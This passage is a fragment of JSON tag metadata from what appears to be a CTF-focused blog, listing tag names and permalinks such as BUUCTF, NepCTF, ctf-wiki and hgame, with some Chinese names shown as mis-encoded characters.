,"permalink":"http://lmarch2.github.io/tags/BUUCTF/"},{"name":"ctfï¼ŒNepCTF","slug":"ctfï¼ŒNepCTF","permalink":"http://lmarch2.github.io/tags/ctf%EF%BC%8CNepCTF/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"http://lmarch2.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"hgame","slug":"hgame","permalink":"http://lmarch2.github.io/tags/hgame/"}]}